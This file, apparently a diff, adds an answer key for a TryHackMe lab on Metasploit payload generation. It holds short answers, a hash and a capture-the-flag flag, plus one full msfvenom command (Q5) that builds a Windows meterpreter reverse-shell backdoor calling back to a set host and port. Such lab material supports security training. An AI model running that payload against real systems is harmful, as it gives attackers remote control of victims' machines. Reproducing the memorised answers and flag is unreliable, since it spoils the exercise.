@@ -1,0 +1,42 @@
+Metasploit: Payload Generation
+https://tryhackme.com/room/metasploitpayloadgeneration
+
+Source: https://github.com/cosmicline/TryHackMe-Answers/blob/e750bcb8aa3be24eb5fce03369f35ccc5ad704f7/Metasploit%3A%20Payload%20Generation
+Room link evidence: https://classroom.anir0y.in/post/thm-room-metasploitpayloadgeneration/
+Answers follow the source's question order; room revisions may change numbering.
+
+Q1
+-f
+
+Q2
+-p
+
+Q3
+stageless
+
+Q4
+elf
+
+Q5
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=5555 -f exe -o backdoor.exe
+
+Q6
+x86/shikata_ga_nai
+
+Q7
+-b
+
+Q8
+-x
+
+Q9
+exploit/multi/handler
+
+Q10
+ExitOnSession
+
+Q11
+1e3fe826df1e5af582a98c034cafa9f4
+
+Q12
+THM{capst0ne_pwn3d_v1a_writable_share}
